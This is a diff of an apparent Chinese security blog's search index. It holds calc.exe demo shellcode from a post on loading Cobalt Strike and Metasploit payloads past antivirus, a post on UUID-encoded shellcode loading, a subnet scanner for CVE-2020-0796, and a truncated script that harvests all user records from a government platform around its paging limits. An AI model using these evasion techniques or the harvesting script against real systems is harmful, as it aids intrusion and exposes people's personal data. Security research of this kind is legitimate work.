     <url>/%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文中所使用的shellcode均使用cs生成，msf同理<br>示例shellcode（打开Windows计算器calc.exe）</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">\xb8\x82\x0a\x8d\x38\xd9\xc6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x23\x31\x42\x12\x83\xea\xfc\x03\xc0\x04\x6f\xcd\x38\xf0\x2b\x2e\xc0\x01\x3f\x6b\xfc\x8a\x43\x71\x84\x8d\x54\xf2\x3b\x96\x21\x5a\xe3\xa7\xde\x2c\x68\x93\xab\xae\x80\xed\x6b\x29\xf0\x8a\xac\x3e\x0f\x52\xe6\xb2\x0e\x96\x1c\x38\x2b\x42\xc7\xc5\x3e\x8f\x8c\x99\xe4\x4e\x78\x43\x6f\x5c\x35\x07\x30\x41\xc8\xfc\x45\x65\x41\x03\xb2\x1f\x09\x20\x40\xe3\x83\xe8\x2c\x68\xa3\xd8\x29\xae\x5c\x15\xba\x6f\x91\xae\xcc\x73\x04\x3b\x44\x84\xbd\x35\x1f\x14\xf1\x46\x1f\x15\x79\x2e\x23\x4a\x4c\x59\x3b\x22\x27\x5d\x38\x0a\x4c\xce\x56\xf5\x6b\x0c\xd5\x61\x14\x2f\x93\x7c\x73\x2f\x44\xe3\x1a\xa3\xe9\xe4</span><br></pre></td></tr></table></figure>
@@ -456,7 +456,25 @@
       </tags>
   </entry>
   <entry>
-    <title>初识itchat-站在巨人的肩膀上python操作微信</title>
+    <title>分布式子域名扫描轮子（Demo）</title>
+    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90(demo)/</url>
+    <content><![CDATA[<p>Github：<a href="https://github.com/GuoKerS/domain_scan_demo">domain_scan_demo</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是之前的一个很简陋的分布式子域名扫描的轮子，为了尝试分布式以及docker的使用（后来再了解到了celery这样的任务调度神器，也用celery写了一个），这里程序是以mysql作为broker和backend，然后调用 <a href="https://github.com/shmilylty/OneForAll">oneforall</a>进行子域名扫描，并且做成了docker方便自己在其他vps上开箱即用。</p>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d . # 启动镜像（不含mysql）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- mysql起一个就够了，可以自行用docker起（SRC_Scan.sql为数据库结构）</span><br><span class="line">- 记得修改Mysql数据库配置信息 __config__.py</span><br><span class="line">- 记得修改oneforall用到的api信息 lib\oneforall\api.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>domains表中的domain为待进行扫描的域名（其他字段可以留空）</p>
+<p>subdomains表为子域名结果</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> subdomains <span class="keyword">WHERE</span> <span class="string">`status`</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">AND</span> title <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">LIMIT</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line">过滤掉了状态码和title为空的结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photo.o0o0.club/_%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90%EF%BC%88demo%EF%BC%89/1588756110496.png" alt="结果"></p>
+<p><img src="https://photo.o0o0.club/_%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90%EF%BC%88demo%EF%BC%89/1588756452969.png" alt="数量"></p>
+<h1 id="运行的流程图"><a href="#运行的流程图" class="headerlink" title="运行的流程图"></a>运行的流程图</h1><p><img src="https://photo.o0o0.club/_%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90%EF%BC%88demo%EF%BC%89/1588753552438.png"></p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初识Itchat-站在巨人的肩膀上Python操作微信</title>
     <url>/%E5%88%9D%E8%AF%86itchat-%E7%AB%99%E5%9C%A8%E5%B7%A8%E4%BA%BA%E7%9A%84%E8%82%A9%E8%86%80%E4%B8%8Apython%E6%93%8D%E4%BD%9C%E5%BE%AE%E4%BF%A1/</url>
     <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
 <blockquote>
@@ -524,25 +542,7 @@
       </tags>
   </entry>
   <entry>
-    <title>分布式子域名扫描轮子（demo）</title>
-    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90(demo)/</url>
-    <content><![CDATA[<p>Github：<a href="https://github.com/GuoKerS/domain_scan_demo">domain_scan_demo</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是之前的一个很简陋的分布式子域名扫描的轮子，为了尝试分布式以及docker的使用（后来再了解到了celery这样的任务调度神器，也用celery写了一个），这里程序是以mysql作为broker和backend，然后调用 <a href="https://github.com/shmilylty/OneForAll">oneforall</a>进行子域名扫描，并且做成了docker方便自己在其他vps上开箱即用。</p>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d . # 启动镜像（不含mysql）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- mysql起一个就够了，可以自行用docker起（SRC_Scan.sql为数据库结构）</span><br><span class="line">- 记得修改Mysql数据库配置信息 __config__.py</span><br><span class="line">- 记得修改oneforall用到的api信息 lib\oneforall\api.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>domains表中的domain为待进行扫描的域名（其他字段可以留空）</p>
-<p>subdomains表为子域名结果</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> subdomains <span class="keyword">WHERE</span> <span class="string">`status`</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">AND</span> title <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">LIMIT</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line">过滤掉了状态码和title为空的结果</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://photo.o0o0.club/_%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90%EF%BC%88demo%EF%BC%89/1588756110496.png" alt="结果"></p>
-<p><img src="https://photo.o0o0.club/_%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90%EF%BC%88demo%EF%BC%89/1588756452969.png" alt="数量"></p>
-<h1 id="运行的流程图"><a href="#运行的流程图" class="headerlink" title="运行的流程图"></a>运行的流程图</h1><p><img src="https://photo.o0o0.club/_%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E8%BD%AE%E5%AD%90%EF%BC%88demo%EF%BC%89/1588753552438.png"></p>
-]]></content>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用uuid编码shellcode</title>
+    <title>利用Uuid编码shellcode</title>
     <url>/%E5%88%A9%E7%94%A8uuid%E7%BC%96%E7%A0%81shellcode/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在Github上看到了一个Windows下利用回调的方式加载shellcode的项目，在本地编译复现中发现了作者提到了一个有意思的shellcode混淆方式，并给出了相关文章的地址，利用UUID对shellcode进行编码，然后使用UuidFromStringA函数对数据进行解码后并写入内存，而不再需要使用memcpy、WriteProcessMemory等函数再写入内存。最后直接利用EnumSystemLocalesA函数执行解码后的shellcode</p>
 <h1 id="编码UUID"><a href="#编码UUID" class="headerlink" title="编码UUID"></a>编码UUID</h1><p><img src="https://photo.o0o0.club/%E5%88%A9%E7%94%A8uuid%E7%BC%96%E7%A0%81shellcode/1614770993432.png"></p>
@@ -583,7 +583,7 @@
       </tags>
   </entry>
   <entry>
-    <title>在alpine中安装gevent的骚操作</title>
+    <title>在Alpine中安装gevent的骚操作</title>
     <url>/%E5%9C%A8alpine%E4%B8%AD%E5%AE%89%E8%A3%85gevent%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
     <content><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>周末用Flask框架写了一个Xray的Webhook服务端，其实主要是完成了3个简单的功能，漏洞入库、漏洞推送（钉钉）、记录xray节点信息，并打算将其通过docker部署。</p>
 <p>构造Dockerfile过程中基础镜像我选择了python3.7-alpine，在使用pip安装相关的库时发现到gevent时会报错（其实可以不用装gevent，但因为用了gunicorn做WSGI Server并且用了gevent来启服务）</p>
@@ -607,7 +607,27 @@
       </tags>
   </entry>
   <entry>
-    <title>安全信息资料库（感谢backlion整理）</title>
+    <title>基于协程的CVE-2020-0796检测脚本</title>
+    <url>/%E5%9F%BA%E4%BA%8E%E5%8D%8F%E7%A8%8B%E7%9A%84CVE-2020-0796%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在公开的POC基础上利用协程大幅提升了检测速度，方便运维师傅们快速的对内网进行检测。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows 10 Version 1903 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1903 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1903 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows Server, Version 1903 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows Server, Version 1909 (Server Core installation)</span><br></pre></td></tr></table></figure>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>参考微软的临时解决方案<br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV200005">ADV200005 | Microsoft Guidance for Disabling SMBv3 Compression</a></p>
+<p>使用powershell来禁止SMBv3服务的压缩（无需重启）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> DisableCompression <span class="literal">-Type</span> DWORD <span class="literal">-Value</span> <span class="number">1</span> <span class="literal">-Force</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p><del>请使用python3.5及以上的版本运行。</del><br>请使用python3.7及以上的版本运行（由于asyncio.run是3.7新增的API，我只考虑到了async\await 是3.5新增的语法）</p>
+<p>ip地址处理使用了第三方库 netaddr </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install netaddr</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E5%9F%BA%E4%BA%8E%E5%8D%8F%E7%A8%8B%E7%9A%84CVE-2020-0796%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/1584228250694.png"></p>
+<p>如果不想显示连接超时的ip信息，可以把39行换成pass</p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> netaddr <span class="keyword">import</span> IPNetwork</span><br><span class="line"></span><br><span class="line">pkt = <span class="string">b&#x27;\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x02\x02\x10\x02&quot;\x02$\x02\x00\x03\x02\x03\x10&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x03\x11\x03\x00\x00\x00\x00\x01\x00&amp;\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">connet</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fut = asyncio.open_connection(ip, <span class="number">445</span>)</span><br><span class="line">        reader, writer = <span class="keyword">await</span> asyncio.wait_for(fut, timeout=<span class="number">3</span>)</span><br><span class="line">        writer.write(pkt)</span><br><span class="line">        <span class="keyword">await</span> writer.drain()</span><br><span class="line">        size, = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, (<span class="keyword">await</span> reader.read(<span class="number">4</span>)))</span><br><span class="line">        ret = <span class="keyword">await</span> reader.read(size)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ret[<span class="number">68</span>:<span class="number">70</span>] != <span class="string">b&quot;\x11\x03&quot;</span> <span class="keyword">or</span> ret[<span class="number">70</span>:<span class="number">72</span>] != <span class="string">b&quot;\x02\x00&quot;</span>:</span><br><span class="line">            print(<span class="string">f&quot;[-]<span class="subst">&#123;ip&#125;</span> Not vulnerable.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">f&quot;[*]<span class="subst">&#123;ip&#125;</span> Vulnerable!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> (asyncio.TimeoutError, ConnectionRefusedError, OSError):</span><br><span class="line">        print(<span class="string">f&#x27;[-]<span class="subst">&#123;ip!r&#125;</span>connection failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">ips</span>):</span></span><br><span class="line">    tasks = []</span><br><span class="line">    ips = [str(ip) <span class="keyword">for</span> ip <span class="keyword">in</span> IPNetwork(ips)]</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        tasks.append(asyncio.create_task(connet(ip)))</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        ips = sys.argv[<span class="number">1</span>]</span><br><span class="line">        asyncio.run(main(ips))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Usage :     python main.py 10.10.10.10</span></span><br><span class="line"><span class="string">            python main.py 10.10.10.0/24</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">Info  :     使用协程加快了扫描速度</span></span><br><span class="line"><span class="string">            请在python 3.7及以上的版本运行</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">POC   :     https://github.com/ollypwn/SMBGhost/blob/master/scanner.py</span></span><br><span class="line"><span class="string">                                                                        </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>渗透</tag>
+        <tag>运维</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安全信息资料库（感谢Backlion整理）</title>
     <url>/%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E8%B5%84%E6%96%99%E5%BA%93%EF%BC%88%E6%84%9F%E8%B0%A2backlion%E6%95%B4%E7%90%86%EF%BC%89/</url>
     <content><![CDATA[<p>原文地址：<br><a href="https://www.t00ls.net/pytools.html">https://www.t00ls.net/pytools.html</a></p>
 <p>感谢backlion整理</p>
@@ -801,23 +821,17 @@
       </tags>
   </entry>
   <entry>
-    <title>基于协程的CVE-2020-0796检测脚本</title>
-    <url>/%E5%9F%BA%E4%BA%8E%E5%8D%8F%E7%A8%8B%E7%9A%84CVE-2020-0796%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在公开的POC基础上利用协程大幅提升了检测速度，方便运维师傅们快速的对内网进行检测。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows 10 Version 1903 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1903 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1903 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows Server, Version 1903 (Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows Server, Version 1909 (Server Core installation)</span><br></pre></td></tr></table></figure>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>参考微软的临时解决方案<br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV200005">ADV200005 | Microsoft Guidance for Disabling SMBv3 Compression</a></p>
-<p>使用powershell来禁止SMBv3服务的压缩（无需重启）</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> DisableCompression <span class="literal">-Type</span> DWORD <span class="literal">-Value</span> <span class="number">1</span> <span class="literal">-Force</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p><del>请使用python3.5及以上的版本运行。</del><br>请使用python3.7及以上的版本运行（由于asyncio.run是3.7新增的API，我只考虑到了async\await 是3.5新增的语法）</p>
-<p>ip地址处理使用了第三方库 netaddr </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install netaddr</span><br></pre></td></tr></table></figure>
-<p><img src="https://photo.o0o0.club/_%E5%9F%BA%E4%BA%8E%E5%8D%8F%E7%A8%8B%E7%9A%84CVE-2020-0796%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/1584228250694.png"></p>
-<p>如果不想显示连接超时的ip信息，可以把39行换成pass</p>
-<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> netaddr <span class="keyword">import</span> IPNetwork</span><br><span class="line"></span><br><span class="line">pkt = <span class="string">b&#x27;\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x02\x02\x10\x02&quot;\x02$\x02\x00\x03\x02\x03\x10&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x03\x11\x03\x00\x00\x00\x00\x01\x00&amp;\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00&#x27;</span> \</span><br><span class="line">      <span class="string">b&#x27;\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">connet</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fut = asyncio.open_connection(ip, <span class="number">445</span>)</span><br><span class="line">        reader, writer = <span class="keyword">await</span> asyncio.wait_for(fut, timeout=<span class="number">3</span>)</span><br><span class="line">        writer.write(pkt)</span><br><span class="line">        <span class="keyword">await</span> writer.drain()</span><br><span class="line">        size, = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, (<span class="keyword">await</span> reader.read(<span class="number">4</span>)))</span><br><span class="line">        ret = <span class="keyword">await</span> reader.read(size)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ret[<span class="number">68</span>:<span class="number">70</span>] != <span class="string">b&quot;\x11\x03&quot;</span> <span class="keyword">or</span> ret[<span class="number">70</span>:<span class="number">72</span>] != <span class="string">b&quot;\x02\x00&quot;</span>:</span><br><span class="line">            print(<span class="string">f&quot;[-]<span class="subst">&#123;ip&#125;</span> Not vulnerable.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">f&quot;[*]<span class="subst">&#123;ip&#125;</span> Vulnerable!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> (asyncio.TimeoutError, ConnectionRefusedError, OSError):</span><br><span class="line">        print(<span class="string">f&#x27;[-]<span class="subst">&#123;ip!r&#125;</span>connection failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">ips</span>):</span></span><br><span class="line">    tasks = []</span><br><span class="line">    ips = [str(ip) <span class="keyword">for</span> ip <span class="keyword">in</span> IPNetwork(ips)]</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        tasks.append(asyncio.create_task(connet(ip)))</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        ips = sys.argv[<span class="number">1</span>]</span><br><span class="line">        asyncio.run(main(ips))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Usage :     python main.py 10.10.10.10</span></span><br><span class="line"><span class="string">            python main.py 10.10.10.0/24</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">Info  :     使用协程加快了扫描速度</span></span><br><span class="line"><span class="string">            请在python 3.7及以上的版本运行</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">POC   :     https://github.com/ollypwn/SMBGhost/blob/master/scanner.py</span></span><br><span class="line"><span class="string">                                                                        </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    <title>获取级联平台所有用户信息的小脚本</title>
+    <url>/%E8%8E%B7%E5%8F%96%E7%BA%A7%E8%81%94%E5%B9%B3%E5%8F%B0%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个在级联平台上获取全部用户信息的小脚本，由于平台自身的安全设置较为严格导致无法短时间内多次点击下一页查看信息（一页十条），因此使用F12大法分析到了用户信息的接口，通过对参数的调试得到了一条请求获取全部用户信息的方法，但由于接口返回的并不是json格式，而是直接返回html的内容，所以这里还调用了第三方库lxml对html经行解析，最后将用户信息保存成表格。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install lxml # 安装第三方库</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_README.md/1583678845788.png"></p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_count</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;http://dc.gov110.cn/control_center/controlCenterIndex/getRegisterGovUserCount&#x27;</span></span><br><span class="line">    req = requests.request(<span class="string">&#x27;POST&#x27;</span>, url, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;totalUserCount&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> req.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;totalUserCount&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]请检测cookie中y值是否正确！&#x27;</span>)</span><br><span class="line">        exit(<span 